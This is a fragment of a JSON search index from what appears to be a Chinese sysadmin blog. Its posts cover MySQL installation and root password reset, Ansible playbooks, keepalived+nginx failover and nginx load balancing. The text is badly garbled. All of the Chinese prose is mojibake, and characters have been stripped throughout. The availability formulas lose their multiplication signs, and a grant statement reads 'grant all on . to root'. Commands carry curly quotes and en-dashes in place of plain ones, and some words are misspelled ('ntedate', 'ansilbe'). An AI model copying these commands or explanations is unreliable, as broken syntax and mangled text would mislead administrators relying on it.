19:32","objectID":"/post/293/:0:5","tags":["mysql"],"title":"mysql5.5.32é…ç½®å¤šå®ä¾‹","uri":"/post/293/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆå§‹åŒ–æ•°æ®åº“ /application/mysql/scripts/mysql_install_db --basedir=/application/mysql --datadir=/data/3306/data --user=mysql /application/mysql/scripts/mysql_install_db --basedir=/application/mysql --datadir=/data/3307/data --user=mysql ","date":"2019-06-01 19:32","objectID":"/post/293/:0:6","tags":["mysql"],"title":"mysql5.5.32é…ç½®å¤šå®ä¾‹","uri":"/post/293/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å¯åŠ¨æ•°æ®åº“ /data/3306/mysql start /data/3307/mysql start ","date":"2019-06-01 19:32","objectID":"/post/293/:0:7","tags":["mysql"],"title":"mysql5.5.32é…ç½®å¤šå®ä¾‹","uri":"/post/293/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"mysql5.5.32æºç åŒ…ä¸‹è½½åœ°å€ï¼š https://cdn.mysql.com/archives/mysql-5.5/mysql-5.5.32.tar.gz 1.å®‰è£…ä¾èµ–åŒ… yum install -y cmake ncurses-devel 2.åˆ›å»ºç”¨æˆ·ã€ç»„ groupadd mysql useradd mysql -s /sbin/nologin -M -g mysql 3.è§£å‹mysql tar xf mysql-5.5.32.tar.gz cd mysql-5.5.32 4.ç¼–è¯‘ cmake . -DCMAKE_INSTALL_PREFIX=/application/mysql-5.5.32 \\ -DMYSQL_DATADIR=/application/mysql-5.5.32/data \\ -DMYSQL_UNIX_ADDR=/application/mysql-5.5.32/tmp/mysql.sock \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci \\ -DEXTRA_CHARSET=gbk,gb2312,utf8,ascii \\ -DENABLED_LOCAL_INFILE=on \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_FEDERATED_STORAGE_ENGINE=1 \\ -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \\ -DWITHOUT_EXAMPL_ESTORAGE_ENGINE=1 \\ -DWITHOUT_PARTITION_ESTORAGE_ENGINE=1 \\ -DWITH_FAST_MUTEXES=1 \\ -DWITH_ZLIB=bundled \\ -DENABLED_LOCAL_INFILE=1 \\ -DWITH_READLINE=1 \\ -DWITH_ENBEDDED_SERVER=1 \\ -DWITH_DEBUG=0 5.å®‰è£… make \u0026\u0026 make install 6.åˆ›å»ºè½¯é“¾æ¥ ln â€“s /application/mysql-5.5.32/ /application/mysql 7.å¤åˆ¶é…ç½®æ–‡ä»¶ cp /application/mysql/support-files/my-small.cnf /etc/my.cnf 8.é…ç½®ç¯å¢ƒå˜é‡ echo â€™export PATH=/application/mysql/bin:$PATHâ€™ \u003e\u003e /etc/profile source /etc/profile 9.åˆå§‹åŒ–mysql chown -R mysql:mysql /application/mysql/data /application/mysql/scripts/mysql_install_dbÂ â€“user=mysqlÂ â€“basedir=/application/mysql â€“datadir=/application/mysql/data 10.åˆ›å»ºå¯åŠ¨è„šæœ¬ cp /application/mysql/support-files/mysql.server /etc/init.d/mysqld chmod +xÂ /etc/init.d/mysqld 11.å¯åŠ¨æœåŠ¡å¹¶è®¾ç½®å¼€æœºè‡ªå¯ service mysqld start chkconfig mysqld on 12.åˆ›å»ºå’Œæ›´æ”¹å¯†ç  /application/mysql//bin/mysqladmin -u root password â€™new-password' æˆ– /application/mysql//bin/mysqladmin -u root -h localhost password â€™new-password' 13.åˆ é™¤mysqlç©ºç”¨æˆ· mysql\u003eÂ delete from mysql.user where user=â€™'; 14.åˆ é™¤teståº“ mysql\u003e drop database test; ","date":"2019-06-01 19:29","objectID":"/post/286/:0:0","tags":["mysql"],"title":"mysql5.5.32æºä»£ç å®‰è£…","uri":"/post/286/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"è·³è¿‡mysqlçš„TCP/IPè¿æ¥æ–¹å¼å’ŒéªŒè¯æ¨¡å— éœ€è¦ç”¨åˆ°ä¸¤ä¸ªå‚æ•°ï¼š â€“skip-grant-tablesï¼šè·³è¿‡åŠ è½½æˆæƒè¡¨ï¼ˆmysql.userï¼‰ â€“skip-networkingï¼šè·³è¿‡åŠ è½½ç½‘ç»œè¿æ¥ï¼ˆå…³é—­é€šè¿‡ç½‘ç»œè¿æ¥ï¼‰ (1)åœæ•°æ®åº“ systemctlÂ stop mysqld (2)è·³è¿‡æˆæƒè¡¨å¯åŠ¨æ•°æ®åº“ mysqld_safe â€“defaults-file=/etc/my.cnf â€“skip-grant-tables â€“skip-networkingÂ \u0026 (3)ä¿®æ”¹å¯†ç  [root@db01 mysql]mysql [(none)]\u003eflush privileges; [(none)]\u003egrant all on . to root@â€™localhostâ€™ identified by â€˜abcâ€™ with grant option; [root@db01 mysql]# mysqladmin -uroot -pabc shutdown [root@db01 mysql]# systemctl start mysqld ","date":"2019-06-01 19:28","objectID":"/post/283/:0:0","tags":["mysql"],"title":"mysqlå¿˜è®°rootå¯†ç è§£å†³æ–¹æ³•","uri":"/post/283/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ä¸‹è½½åœ°å€ï¼šhttps://cdn.mysql.com/archives/mysql-5.7/mysql-5.7.20-linux-glibc2.12-x86_64.tar ","date":"2019-06-01 18:51","objectID":"/post/266/:0:0","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"è§£å‹ tar xf mysql-5.7.20-linux-glibc2.12-x86_64.tar ","date":"2019-06-01 18:51","objectID":"/post/266/:0:1","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆ é™¤æ— ç”¨å‹ç¼©åŒ… rm -rf mysql-5.7.20-linux-glibc2.12-x86_64.tar rm -rf mysql-test-5.7.20-linux-glibc2.12-x86_64.tar.gz ","date":"2019-06-01 18:51","objectID":"/post/266/:0:2","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"è§£å‹mysql tar zxvf mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz ","date":"2019-06-01 18:51","objectID":"/post/266/:0:3","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆ›å»ºå®‰è£…ç›®å½• mkdir -p /server/tools/ ","date":"2019-06-01 18:51","objectID":"/post/266/:0:4","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å°†è§£å‹çš„mysqlç§»åŠ¨åˆ°å®‰è£…ç›®å½• mv mysql-5.7.20-linux-glibc2.12-x86_64 /server/tools/mysql ","date":"2019-06-01 18:51","objectID":"/post/266/:0:5","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"é…ç½®ç¯å¢ƒå˜é‡ echo 'export PATH=/server/tools/mysql/bin:$PATH' \u003e\u003e /etc/profile source /etc/profile ","date":"2019-06-01 18:51","objectID":"/post/266/:0:6","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆ›å»ºmysqlç”¨æˆ· useradd mysql -M -s /sbin/nologin ","date":"2019-06-01 18:51","objectID":"/post/266/:0:7","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆ›å»ºmysqlæ•°æ®å­˜æ”¾ç›®å½• mkdir -p /data/mysql ","date":"2019-06-01 18:51","objectID":"/post/266/:0:8","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"è®¾ç½®ç›®å½•æƒé™ chown -R mysql.mysql /server/tools/mysql chown -R mysql.mysql /data/mysql ","date":"2019-06-01 18:51","objectID":"/post/266/:0:9","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å®‰è£…ä¾èµ–åŒ… yum install -y libaio-devel ","date":"2019-06-01 18:51","objectID":"/post/266/:0:10","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆ é™¤mariadb yum remove mariadb-libs ","date":"2019-06-01 18:51","objectID":"/post/266/:0:11","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆå§‹åŒ–æ•°æ® # 5.7ä»¥ä¸Šç‰ˆæœ¬ mysqld --initialize-insecure --user=mysql --basedir=/server/tools/mysql --datadir=/data/mysql # 5.7ä»¥ä¸‹ç‰ˆæœ¬ # /server/tools/mysql/scripts/mysql_install_db --user=mysql --basedir=/server/tools/mysql --datadir=/data/mysql å‚æ•°è¯´æ˜ï¼š --initializeï¼šå¼€å¯å®‰å…¨ç­–ç•¥ --initialize-insecureï¼šå…³é—­å®‰å…¨ç­–ç•¥ å®‰å…¨ç­–ç•¥ï¼š 1.å¯†ç é•¿åº¦:12ä½ä»¥ä¸Š 2.å¯†ç å¤æ‚åº¦ 3.å¯†ç é»˜è®¤è¿‡æœŸæ—¶é—´180å¤© 4.åˆå§‹åŒ–åä¼šç”Ÿæˆä¸€ä¸ªä¸´æ—¶å¯†ç  --userï¼šæŒ‡å®šmysqlç”¨æˆ· --basedirï¼šmysqlå®‰è£…ç›®å½• --datadirï¼šæ•°æ®å­˜æ”¾ç›®å½• ","date":"2019-06-01 18:51","objectID":"/post/266/:0:12","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆ›å»ºä¿®æ”¹my.cnfé…ç½®æ–‡ä»¶ [root@db01 ~]# cat /etc/my.cnf [mysqld] basedir=/application/mysql datadir=/data/mysql socket=/tmp/mysql.sock pid-file=mysqld.pid server_id=1 port=3306 log-bin=/data/mysql-bin relay-log = /data/mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=information_schema.% gtid-mode=on enforce-gtid-consistency=true [mysql] socket=/tmp/mysql.sock prompt=mysql-[\\\\d]\u003e [mysqld_safe] log-error=/var/log/mysql.log ","date":"2019-06-01 18:51","objectID":"/post/266/:0:13","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"æ·»åŠ å¯åŠ¨è„šæœ¬ centos6 cp /server/tools/mysql/support-files/mysql.server /etc/init.d/mysqld service mysqld start centos7 vi /etc/systemd/system/mysqld.service [Unit] Description=MySQL Server Documentation=man:mysqld(8) Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.html After=network.target After=syslog.target [Install] WantedBy=multi-user.target [Service] User=mysql Group=mysql ExecStart=/server/tools/mysql/bin/mysqld --defaults-file=/etc/my.cnf LimitNOFILE = 5000 ","date":"2019-06-01 18:51","objectID":"/post/266/:0:14","tags":["mysql"],"title":"centos7-mysql5.7.20å…å®‰è£…ç‰ˆé…ç½®åˆå§‹åŒ–","uri":"/post/266/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/ansible/ansible.cfg å°†37è¡Œçš„gatheringä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ gathering = explicit ","date":"2019-06-01 18:50","objectID":"/post/264/:0:0","tags":["ansible"],"title":"ansibleä½¿ç”¨å‰§æœ¬æ—¶å¡æ­»è§£å†³æ–¹æ³•","uri":"/post/264/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"playbooké…ç½®é¡¹è¯´æ˜: --- - hosts: webservers # æ‰§è¡Œä»»åŠ¡çš„ä¸»æœº(all,ç»„åç§°,ip...) vars:Â # å®šä¹‰å˜é‡ã€‚å¼•ç”¨æ–¹å¼ï¼š{{å˜é‡å}} http_port: 80 max_clients: 200 remote_user: root # åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä»»åŠ¡çš„ç”¨æˆ· tasks: # è¦æ‰§è¡Œçš„ä»»åŠ¡åˆ—è¡¨ - name: ensure apache is at the latest version # ä»»åŠ¡åç§°(æ³¨é‡Š) yum: pkg=httpd state=latest # æŒ‡å®šyumæ¨¡å—ï¼Œå¹¶å†™å…¥ç›¸åº”æ¨¡å—çš„ä½¿ç”¨è¯­æ³• - name: copy config file copy: src=./httpd.conf dest=/etc/httpd/conf/httpd.conf notify: restart apache # è§¦å‘handlersä¸­å®šä¹‰çš„restart apache - name: ensure apache is running service: name=httpd state=started handlers: # ä»»åŠ¡ï¼Œä¸tasksä¸åŒçš„æ˜¯åªæœ‰åœ¨æ¥å—åˆ°é€šçŸ¥æ—¶æ‰ä¼šè¢«è§¦å‘ - name: restart apache service: name=httpd state=restarted ","date":"2019-06-01 18:38","objectID":"/post/256/:1:0","tags":[],"title":"ansible2.7.5ç¼–å†™ç®€å•å‰§æœ¬playbook","uri":"/post/256/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"ä½¿ç”¨å‰§æœ¬ï¼š ansible-playbook -C 02-cron.ymlÂ # æ£€æŸ¥å‰§æœ¬ï¼Œå‰§æœ¬ä¸­å­˜åœ¨å˜é‡æ—¶æ£€æŸ¥ä¼šæŠ¥é”™ ansible-playbook 02-cron.ymlÂ # æ‰§è¡Œå‰§æœ¬ ä¸¾ä¾‹ï¼š --- - hosts: web tasks: - name: show hostname command: hostname --- - hosts: web tasks: - name: add cron cron: name=\"ansible test\" minute=10 job=\"ntedate time.windows.com \u003e/dev/null 2\u003e\u00261\" state=present ","date":"2019-06-01 18:38","objectID":"/post/256/:2:0","tags":[],"title":"ansible2.7.5ç¼–å†™ç®€å•å‰§æœ¬playbook","uri":"/post/256/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"registerç±»å‹å˜é‡ï¼š --- - hosts: web tasks: - name: show ip address shell: hostname -I | awk '{print $2}' register: ip - name: print ip var to file shell: echo {{ip}} \u0026gt; /tmp/ip ä¸Šé¢çš„å‰§æœ¬é¦–å…ˆæ‰§è¡ŒæŸ¥ipçš„å‘½ä»¤ï¼Œå°†æ‰§è¡Œç»“æœé€šè¿‡registerå˜é‡èµ‹å€¼ç»™å˜é‡ipï¼Œç„¶ååœ¨å°†å˜é‡ipä¸­çš„å†…å®¹è¿½åŠ åˆ°æ–‡ä»¶ä¸­ã€‚ æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š { stderr_lines:Â [], uchanged:Â True, uend:Â u2019-03-06Â 21:34:22.662536, failed:Â False, ustdout:Â u172.16.1.7, ucmd:Â uhostnameÂ -IÂ |Â awkÂ '{printÂ }', urc:Â 0, ustart:Â u2019-03-06Â 21:34:22.651661, ustderr:Â u, udelta:Â u0:00:00.010875, stdout_lines:Â [u172.16.1.7] } æˆ‘ä»¬æƒ³è¦çš„ç»“æœæ˜¯ipï¼Œå…¶ä»–çš„å†…å®¹ä¸éœ€è¦ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨å˜é‡å¾—æ—¶å€™ä½¿ç”¨ip.stdoutï¼Œå³ï¼š --- -Â hosts:Â web tasks: -Â name:Â showÂ ipÂ address shell:Â hostnameÂ -IÂ |Â awkÂ '{printÂ $2}' register:Â ip -Â name:Â printÂ ipÂ varÂ toÂ file shell:Â echoÂ {{ip.stdout}}Â \u0026gt;Â /tmp/ip åœ¨å±å¹•ä¸­æ˜¾ç¤ºå‰§æœ¬çš„æ‰§è¡Œç»“æœï¼š --- -Â hosts:Â web tasks: -Â name:Â showÂ hostname command:Â hostname register:Â name -Â name:Â printÂ hostname debug:Â msg={{name.stdout}} è¿™é‡Œç”¨åˆ°debugæ¨¡å—,msgè¡¨ç¤ºæ‰“å°è‡ªå®šä¹‰æ¶ˆæ¯ï¼Œå†…å®¹å°±æ˜¯æˆ‘ä»¬è·å–åˆ°ç»“æœçš„å˜é‡ã€‚ ","date":"2019-06-01 18:38","objectID":"/post/256/:2:1","tags":[],"title":"ansible2.7.5ç¼–å†™ç®€å•å‰§æœ¬playbook","uri":"/post/256/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"å¾ªç¯ï¼š --- - hosts: web tasks: - name: print loop debug debug: msg={{item}} with_items: - 1 - 2 - 3 ","date":"2019-06-01 18:38","objectID":"/post/256/:2:2","tags":[],"title":"ansible2.7.5ç¼–å†™ç®€å•å‰§æœ¬playbook","uri":"/post/256/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"åˆ¤æ–­: --- - hosts: all tasks: - name: yum install nfs-utils rpcbind yum: name=nfs-utils,rpcbind state=present when: ( ansible_hostname == \"nfs01\" ) or ( ansible_hostname == \"backup\" ) åªæœ‰ä¸»æœºåæ˜¯nfs01æˆ–backupæ—¶å®‰è£…nfs-utils rpcbind ansible_hostnameç­‰å˜é‡å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥è¯¢ ansilbeÂ ip -m setup ","date":"2019-06-01 18:38","objectID":"/post/256/:2:3","tags":[],"title":"ansible2.7.5ç¼–å†™ç®€å•å‰§æœ¬playbook","uri":"/post/256/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åœ¨è½¯ä»¶ç³»ç»Ÿçš„é«˜å¯é æ€§ï¼ˆä¹Ÿç§°ä¸ºå¯ç”¨æ€§ï¼Œè‹±æ–‡æè¿°ä¸ºHAï¼ŒHigh Availableï¼‰ é‡Œæœ‰ä¸ªè¡¡é‡å…¶å¯é æ€§çš„æ ‡å‡†â€”â€”Xä¸ª9ï¼Œè¿™ä¸ªXé€šå¸¸ä»£è¡¨æ•°å­—3~5ã€‚Xä¸ª9è¡¨ç¤ºåœ¨è½¯ä»¶ç³»ç»Ÿ1å¹´æ—¶é—´çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨æ—¶é—´ä¸æ€»æ—¶é—´ï¼ˆ1å¹´ï¼‰ä¹‹æ¯”ï¼Œ æˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„è®¡ç®—æ¥æ„Ÿå—ä¸‹Xä¸ª9åœ¨ä¸åŒçº§åˆ«çš„å¯é æ€§å·®å¼‚ã€‚ 1ä¸ª9ï¼š(1-90%)*365=36.5å¤© è¡¨ç¤ºè¯¥è½¯ä»¶ç³»ç»Ÿåœ¨è¿ç»­è¿è¡Œ1å¹´æ—¶é—´é‡Œæœ€å¤šå¯èƒ½çš„ä¸šåŠ¡ä¸­æ–­æ—¶é—´æ˜¯36.5å¤© 2ä¸ª9ï¼š(1-99%)*365=3.65å¤© è¡¨ç¤ºè¯¥è½¯ä»¶ç³»ç»Ÿåœ¨è¿ç»­è¿è¡Œ1å¹´æ—¶é—´é‡Œæœ€å¤šå¯èƒ½çš„ä¸šåŠ¡ä¸­æ–­æ—¶é—´æ˜¯3.65å¤© 3ä¸ª9ï¼š(1-99.9%)36524=8.76å°æ—¶ è¡¨ç¤ºè¯¥è½¯ä»¶ç³»ç»Ÿåœ¨è¿ç»­è¿è¡Œ1å¹´æ—¶é—´é‡Œæœ€å¤šå¯èƒ½çš„ä¸šåŠ¡ä¸­æ–­æ—¶é—´æ˜¯8.76å°æ—¶ 4ä¸ª9ï¼š(1-99.99%)36524=0.876å°æ—¶=52.6åˆ†é’Ÿ è¡¨ç¤ºè¯¥è½¯ä»¶ç³»ç»Ÿåœ¨è¿ç»­è¿è¡Œ1å¹´æ—¶é—´é‡Œæœ€å¤šå¯èƒ½çš„ä¸šåŠ¡ä¸­æ–­æ—¶é—´æ˜¯52.6åˆ†é’Ÿ 5ä¸ª9ï¼š(1-99.999%)36524*60=5.26åˆ†é’Ÿ è¡¨ç¤ºè¯¥è½¯ä»¶ç³»ç»Ÿåœ¨è¿ç»­è¿è¡Œ1å¹´æ—¶é—´é‡Œæœ€å¤šå¯èƒ½çš„ä¸šåŠ¡ä¸­æ–­æ—¶é—´æ˜¯5.26åˆ†é’Ÿ 6ä¸ª9ï¼š(1-99.9999%)365246060=31ç§’ è¡¨ç¤ºè¯¥è½¯ä»¶ç³»ç»Ÿåœ¨è¿ç»­è¿è¡Œ1å¹´æ—¶é—´é‡Œæœ€å¤šå¯èƒ½çš„ä¸šåŠ¡ä¸­æ–­æ—¶é—´æ˜¯31ç§’ ","date":"2019-06-01 18:37","objectID":"/post/254/:0:0","tags":[],"title":"6ä¸ª9è¿ç»´ï¼Œç³»ç»Ÿçš„ç¨³å®šå¯é æ€§","uri":"/post/254/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"é«˜å¯ç”¨ï¼šå®ç°è‡ªåŠ¨åˆ‡æ¢ä¸»å¤‡æœåŠ¡å™¨ å®ç°æ–¹å¼ï¼š ä¸€èˆ¬æœåŠ¡å™¨å®ç°æ–¹å¼ï¼škeepalivedã€heartbeat ç‰¹æ®ŠæœåŠ¡å™¨å®ç°æ–¹å¼ï¼šmysqlï¼ˆMHAÂ MMMï¼‰ã€Redis(ä¸»ä»ã€å“¨å…µæ¨¡å¼ã€é›†ç¾¤) éƒ¨ç½²keepalivedæœåŠ¡: lb01Â 10.0.0.5Â å®‰è£…keepalived lb02Â 10.0.0.6Â å®‰è£…keepalived web01 web02 web03 # å®‰è£…keepalived(lb01ï¼Œlb02) yum install -y keepalived # é…ç½®æ–‡ä»¶è¯´æ˜===\u003e/etc/keepalived/keepalived.conf å…¨å±€é…ç½®global_defs æŠ¥è­¦åŠŸèƒ½Â â€” å¯ä½¿ç”¨zabbixä»£æ›¿ é«˜å¯ç”¨èŠ‚ç‚¹åç§°(lb01)ï¼š global_defs { router_idÂ lb01Â # æ¯å°æœåŠ¡å™¨åç§°ä¸åŒ,ä¸€èˆ¬ä½¿ç”¨ä¸»æœºåå³å¯ } VRRPé…ç½®ï¼ˆè¯´æ˜ï¼‰ 1ã€åˆ©ç”¨vrrpåè®®ï¼Œå®ç°å¤šå°é«˜å¯ç”¨ä¸»æœºé€šè®¯ 2ã€å¯ä»¥å®Œæˆä¸»å¤‡ç«é€‰æœºåˆ¶ï¼Œé«˜å¯ç”¨é›†ç¾¤ä¸­åªæœ‰ä¸€ä¸ªä¸»æœåŠ¡å™¨ï¼Œå¯æœ‰å¤šä¸ªå¤‡æœåŠ¡å™¨ ä¸»æœåŠ¡å™¨downåï¼Œæ¢å¤æ—¶ä¼šå†æ¬¡æˆä¸ºä¸»æœåŠ¡å™¨ 3ã€é€‰å‡ºä¸»æœåŠ¡å™¨åï¼Œç”±ä¸»æœåŠ¡å™¨å‘é€ç»„æ’­åŒ…ä¿¡æ¯ 4ã€ä¸»æœåŠ¡å™¨æ‹¥æœ‰vipåœ°å€ï¼Œç”¨æˆ·è®¿é—®vipåœ°å€ ################################### 1.MASTERé…ç½®(lb01) global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id keep-01 } # å®šä¹‰ä¸€ä¸ªçŠ¶æ€æ£€æŸ¥,scriptä¸­ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œä½†è„šæœ¬éœ€æœ‰è¿”å›å€¼ vrrp_script check_nginx { # æ¯2ç§’æ£€æŸ¥ä¸€æ¬¡nginxè¿›ç¨‹çŠ¶æ€ï¼Œæ ¹æ®å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç å»åˆ¤æ–­æœåŠ¡æ˜¯å¦æ­£å¸¸ script \"/usr/bin/killall -0 nginx\" interval 2 # 2æ¬¡çŠ¶æ€å—ä¸ºé0æ‰ä¸ºå¤±è´¥çŠ¶æ€ fall 2 # 2æ¬¡çŠ¶æ€ç ä¸º0æ‰ä¸ºæ­£å¸¸çŠ¶æ€ rise 2 } vrrp_instance nginx { # è®¾ç½®ä¸ºmaster state MASTER # æŒ‡å®šç½‘å¡ interface eth0 # vrrpæ ‡è¯†1-255(éœ€è¦å’Œå¤‡èŠ‚ç‚¹ä¸€è‡´) virtual_router_id 51 # æŒ‡å®šä¼˜å…ˆçº§ï¼Œå€¼è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ priority 100 # ç»„æ’­åŒ…é—´éš”æ—¶é—´ advert_int 1 # è®¤è¯ authentication { auth_type PASS auth_pass 1111 } # é…ç½®vip virtual_ipaddress { 10.0.0.3 } # æŒ‡å®šè¿›å…¥ä¸åŒçŠ¶æ€æ—¶è¦æ‰§è¡Œçš„è„šæœ¬ #notify_master \"/server/scripts/keepalive/master.sh\" #notify_backup \"/server/scripts/keepalive/backup.sh\" #notify_fault \"/server/scripts/keepalive/fault.sh\" # å¼•ç”¨ä¸Šé¢å®šä¹‰çš„çŠ¶æ€æ£€æŸ¥ track_script { check_nginx } } 2.BACKUPé…ç½®(lb02) global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id keep-02 } vrrp_script check_nginx { script \"/usr/bin/killall -0 nginx\" interval 2 fall 2 rise 2 } vrrp_instance nginx { state BACKUP interface eth0 virtual_router_id 51 priority 50 advert_int 1 authentication { auth_type PASS auth_pass 1111 } #notify_master \"/server/scripts/keepalive/master.sh\" #notify_backup \"/server/scripts/keepalive/backup.sh\" #notify_fault \"/server/scripts/keepalive/fault.sh\" virtual_ipaddress { 10.0.0.3 } track_script { check_nginx } } ","date":"2019-06-01 18:35","objectID":"/post/249/:0:0","tags":["keepalievd"],"title":"keepalived+nginxé«˜å¯ç”¨æœåŠ¡éƒ¨ç½²","uri":"/post/249/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"é…ç½®å®˜æ–¹æº vim /etc/yum.repos.d/nginx.repo [nginx-stable] name=nginx stable repo baseurl=http://nginx.org/packages/centos/$releasever/$basearch/ gpgcheck=1 enabled=1 gpgkey=https://nginx.org/keys/nginx_signing.key å®‰è£… yum install -y nginx æŸ¥è¯¢é…ç½®æ–‡ä»¶ç­‰ç›®å½• rpm -ql nginx ","date":"2019-06-01 18:34","objectID":"/post/247/:0:0","tags":["nginx"],"title":"centos7-yumå®‰è£…nginx","uri":"/post/247/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"web02é…ç½®ï¼ˆæˆ‘çš„æµ‹è¯•ç¯å¢ƒweb01å’Œweb03ä¹Ÿæ˜¯ä¸€æ ·çš„é…ç½®ï¼‰ [root@web02 conf.d]# cat /etc/nginx/conf.d/{bbs,www}.conf server { listenÂ 80; server_nameÂ bbs.soulchild.cn; location / { rootÂ /html/bbs; indexÂ index.html; } } server { listenÂ 80; server_nameÂ www.soulchild.cn; location / { rootÂ /html/www; indexÂ index.html; } } [root@web02 conf.d]# cat /html/{bbs,www}/index.html web02-10.0.0.8-bbs web02-10.0.0.8-www è´Ÿè½½å‡è¡¡lb01é…ç½® [root@lb01 ~]# cat /etc/nginx/conf.d/lb.conf server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; index index.html index.htm; proxy_pass http://soulchild; proxy_set_header host $host; proxy_set_headerÂ X-Real-IPÂ $remote_addr; proxy_set_headerÂ X-Forwarded-For $proxy_add_x_forwarded_for; } } upstream soulchild { server 10.0.0.7:80 backup; server 10.0.0.8:80 weight=7 max_fails=3 fail_timeout=20s; server 10.0.0.9:80 weight=3 max_fails=3 fail_timeout=20s; } upstreamåŒºå—ç‰¹æ®ŠæŒ‡ä»¤å’Œç”¨æ³•ï¼š upstreamï¼šå®šä¹‰é›†ç¾¤ä¿¡æ¯ serverï¼šå®šä¹‰é›†ç¾¤èŠ‚ç‚¹ï¼ˆå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‚æ•°ï¼‰ max_failsï¼šè¿æ¥å¤±è´¥ï¼Œé‡è¯•æ¬¡æ•°ï¼ˆé»˜è®¤1ï¼‰ fail_timeoutï¼šé‡æ–°æ£€æŸ¥é—´éš”æ—¶é—´(é»˜è®¤10s),å¤±è´¥æŒ‡å®šæ¬¡æ•°(max_fails)å,é—´éš”(fail_timeout)æ—¶é—´å,é‡è¯•1æ¬¡ï¼Œå¤±è´¥åˆ™ç»“æŸ.(æˆåŠŸåä¸‹æ¬¡æ£€æµ‹è¿˜æ˜¯3æ¬¡æœºä¼š) backupï¼šçƒ­å¤‡ï¼Œæ‰€æœ‰èŠ‚ç‚¹ä¸èƒ½è®¿é—®æ—¶ï¼Œä½¿ç”¨backup 